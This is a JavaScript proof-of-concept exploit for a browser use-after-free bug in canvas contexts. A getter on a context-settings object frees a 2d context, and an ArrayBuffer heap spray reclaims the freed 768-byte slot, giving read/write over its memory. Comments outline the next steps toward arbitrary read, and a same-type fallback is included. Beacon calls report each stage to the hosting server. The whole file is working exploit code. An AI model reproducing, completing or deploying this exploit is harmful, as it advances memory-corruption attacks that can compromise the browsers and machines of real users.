// p488 — Cross-type UAF: bitmaprenderer outer + 2d inner → freed 2d slot + AB spray
//
// The opaque root mechanism prevents freeing a same-type spray context.
// SOLUTION: use getContext('bitmaprenderer', s) as outer call.
// s.alpha getter triggers inner getContext('2d') → creates 2d C1.
// Outer creates bitmaprenderer → m_context = bitmap → destroys C1 → 768B freed!
//
// dCtx keeps the dangling wrapper alive → GC safe:
//   visitAdditionalChildren: addOpaqueRoot reads zeroed m_canvas as hash key → safe
//   isReachableFromOpaqueRoots: NOT called (dCtx reachable → wrapper marked)
//
// After AB spray fills the freed 768B slot:
//   save() writes m_unrealizedSaveCount (fixed offset, no m_stateStack access)
//   Scan ABs for marker → identifies target AB → R/W primitive!
//
// MUST NOT read lineWidth/globalAlpha/etc (zeroed m_stateStack → CrashOnOverflow)
//
// Beacon prefix: V488-
(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();

  function B(tag, body) {
    try {
      var dt = Date.now() - T0;
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V488-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + dt + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  // ═══════════════════════════════════════════════════════════
  // TEST 0: Check if bitmaprenderer exists
  // ═══════════════════════════════════════════════════════════
  var testC = document.createElement('canvas');
  testC.width = 1; testC.height = 1;
  var testBM = null;
  try {
    testBM = testC.getContext('bitmaprenderer');
  } catch(e) {
    B('BITMAP-ERR', e.message);
  }
  var hasBitmap = !!testBM;
  B('BITMAP-CHECK', 'available=' + hasBitmap + ',type=' + typeof testBM);
  testC = null; testBM = null;

  // ═══════════════════════════════════════════════════════════
  // TEST 1: Cross-type UAF — bitmaprenderer outer + 2d inner
  // ═══════════════════════════════════════════════════════════
  if (hasBitmap) {
    var dCtx = null, lCtx = null;
    var tc = document.createElement('canvas');
    tc.width = 10; tc.height = 10;
    document.body.appendChild(tc);

    var cc = 0, s = {};
    // Use 'alpha' property since bitmaprenderer settings has 'alpha'
    Object.defineProperty(s, 'alpha', {
      get: function() {
        cc++;
        if (cc === 1) {
          dCtx = tc.getContext('2d');
        }
        return true;
      }
    });

    // Outer call: getContext('bitmaprenderer', s)
    // 1. m_context null → falls through
    // 2. contextId = 'bitmaprenderer' → not 2d
    // 3. Falls to bitmaprenderer path
    // 4. Convert ImageBitmapRenderingContextSettings → reads s.alpha → getter fires
    // 5. Inner: getContext('2d') → creates C1 (2d, 768B) → m_context = C1
    // 6. Getter returns true
    // 7. Outer: createContextBitmapRenderer → m_context = bitmap → C1 FREED
    lCtx = tc.getContext('bitmaprenderer', s);

    B('CROSSTYPE', 'dCtx=' + !!dCtx + ',lCtx=' + !!lCtx + ',cc=' + cc);

    if (!dCtx) {
      B('CROSSTYPE-FAIL', 'dCtx not set, getter may not have fired');
    } else {
      // dCtx is now a dangling 2d context wrapper → freed 768B slot
      // lCtx is the bitmaprenderer context (alive, in m_context)

      // ═══════════════════════════════════════════════════════════
      // Phase 2: AB spray to fill the freed 768B slot
      // ═══════════════════════════════════════════════════════════
      var NUM_ABS = 500;
      var abSpray = [];
      var abViews = [];
      for (var i = 0; i < NUM_ABS; i++) {
        var ab = new ArrayBuffer(768);
        abSpray.push(ab);
        abViews.push(new DataView(ab));
      }
      B('AB-SPRAY', 'count=' + NUM_ABS);

      // ═══════════════════════════════════════════════════════════
      // Phase 3: save() marker + FULL scan
      // save() increments m_unrealizedSaveCount at some fixed offset.
      // On zeroed memory: 0 → 1. Scan all 768 bytes of each AB.
      // ═══════════════════════════════════════════════════════════

      var saveOk = false;
      try {
        dCtx.save();
        saveOk = true;
      } catch(e) {
        B('SAVE-ERR', e.message);
      }
      B('SAVE-CALL', 'ok=' + saveOk);

      if (saveOk) {
        // Full scan: check every uint32 offset in every AB
        var targetIdx = -1;
        var targetOff = -1;
        var hits = [];

        for (var ai = 0; ai < NUM_ABS; ai++) {
          var view = abViews[ai];
          // Scan every 4-byte aligned offset for value == 1
          for (var off = 0; off <= 764; off += 4) {
            var val = view.getUint32(off, true);
            if (val === 1) {
              hits.push('ab=' + ai + ',off=' + off);
              if (targetIdx === -1) {
                targetIdx = ai;
                targetOff = off;
              }
              if (hits.length >= 30) break;
            }
          }
          if (hits.length >= 30) break;
        }

        B('MARKER-SCAN', 'hits=' + hits.length + ',target=' + targetIdx + ',off=' + targetOff);
        if (hits.length > 0 && hits.length <= 10) {
          B('MARKER-DETAIL', hits.join(';'));
        } else if (hits.length > 10) {
          B('MARKER-MANY', hits.slice(0, 10).join(';') + '...');
        }

        if (targetIdx >= 0) {
          // FOUND! The AB at targetIdx overlaps with the freed 2d context
          B('TARGET-FOUND', 'abIdx=' + targetIdx + ',offset=' + targetOff);

          // Verify: call save() again → should increment to 2
          dCtx.save();
          var val2 = abViews[targetIdx].getUint32(targetOff, true);
          B('SAVE2-VERIFY', 'expected=2,got=' + val2 + ',ok=' + (val2 === 2));

          // Verify: write through AB → check with restore count
          // Actually restore() decrements m_unrealizedSaveCount.
          // If count is 2, restore → 1, restore → 0
          dCtx.restore();
          var val3 = abViews[targetIdx].getUint32(targetOff, true);
          B('RESTORE-VERIFY', 'expected=1,got=' + val3);

          dCtx.restore();
          var val4 = abViews[targetIdx].getUint32(targetOff, true);
          B('RESTORE2-VERIFY', 'expected=0,got=' + val4);

          // Write through AB: set count to 5, then read via save/restore count
          abViews[targetIdx].setUint32(targetOff, 5, true);
          // 5 restores should work without crashing (just decrements, no state stack pop)
          var restoreOk = true;
          for (var r = 0; r < 5; r++) {
            try { dCtx.restore(); } catch(e) { restoreOk = false; break; }
          }
          var val5 = abViews[targetIdx].getUint32(targetOff, true);
          B('AB-WRITE-VERIFY', 'setCount=5,after5restores=' + val5 + ',ok=' + restoreOk);

          // Hex dump of surrounding bytes
          var hexDump = '';
          var start = Math.max(0, targetOff - 16);
          var end = Math.min(768, targetOff + 20);
          for (var h = start; h < end; h++) {
            hexDump += ('0' + abViews[targetIdx].getUint8(h).toString(16)).slice(-2);
            if (h === targetOff - 1) hexDump += '[';
            if (h === targetOff + 3) hexDump += ']';
          }
          B('HEX-CONTEXT', 'off=' + start + ':' + hexDump);

          // ═══════════════════════════════════════════════════════════
          // Phase 4: Explore what else we can R/W
          //
          // With AB R/W over the freed context's memory, we can:
          // - Write fake m_stateStack data (m_buffer, m_size, m_capacity)
          // - Then read lineWidth → follows our fake m_buffer pointer!
          // - This gives us arbitrary read if we control m_buffer
          //
          // But we need a POINTER to write into m_buffer. Without an
          // address leak, we can't point m_buffer anywhere useful.
          //
          // Test: write valid-looking m_stateStack and see if lineWidth reads
          // ═══════════════════════════════════════════════════════════

          // We know the AB's DATA is at some address. The m_stateStack inline
          // buffer self-referential pointer would need to point to our AB data.
          // We don't know our AB's address... but we can try self-referential.
          //
          // Actually, let's just find the m_stateStack offset first by writing
          // known values and checking what save/restore does.
          B('PHASE4', 'crosstype UAF + AB alias confirmed');
        }
      }
    }
  }

  // ═══════════════════════════════════════════════════════════
  // FALLBACK: If no bitmaprenderer, try same-type but with full scan
  // ═══════════════════════════════════════════════════════════
  if (!hasBitmap) {
    B('FALLBACK', 'no bitmaprenderer, testing same-type UAF with full scan');

    // Same-type UAF + AB spray approach from V487
    var dCtx1 = null, lCtx1 = null;
    var tc1 = document.createElement('canvas');
    tc1.width = 10; tc1.height = 10;
    document.body.appendChild(tc1);
    var cc1 = 0, s1 = {};
    Object.defineProperty(s1, 'desynchronized', {
      get: function() { cc1++; if (cc1 === 1) dCtx1 = tc1.getContext('2d'); return false; }
    });
    lCtx1 = tc1.getContext('2d', s1);

    if (!dCtx1) { B('ABORT', 'uaf1-fail'); return; }

    // Same-type spray
    var sprayC = [], sprayX = [];
    for (var i = 0; i < 200; i++) {
      var c = document.createElement('canvas');
      c.width = 10; c.height = 10;
      sprayC.push(c);
      var ctx = c.getContext('2d');
      ctx.lineWidth = 500 + i;
      sprayX.push(ctx);
    }

    var lw1 = dCtx1.lineWidth;
    if (typeof lw1 !== 'number' || lw1 < 500 || lw1 >= 700) {
      B('UAF1-MISS', 'lw=' + lw1); return;
    }
    var idx1 = Math.round(lw1 - 500);
    B('UAF1-ALIAS', 'idx=' + idx1);

    // Full 768B save marker scan through the aliased context
    // First, call save() through the aliased context
    dCtx1.save();
    B('SAVE-VIA-ALIAS', 'ok');

    // Now scan: m_unrealizedSaveCount should be 1 at some offset
    // Read through the SPRAY context's AB-like view... but we don't have one.
    // We can't scan the context directly from JS.
    // But we CAN set lineWidth to known values and read back to verify offsets.

    // Check that save() worked (unrealizedSaveCount = 1)
    // restore() when count > 0: just decrements, no state pop
    dCtx1.restore();
    // Count back to 0

    // Set lineWidth through spray, read through dangling
    sprayX[idx1].lineWidth = 12345.5;
    var readBack = dCtx1.lineWidth;
    B('SAVE-READBACK', 'wrote=12345.5,read=' + readBack + ',ok=' + (readBack === 12345.5));

    B('FALLBACK-DONE', 'same-type UAF works but cannot scan for save marker');
  }

  B('DONE', 'completed');

  // Auto-refresh after 10s
  setTimeout(function() { location.reload(); }, 10000);
})();
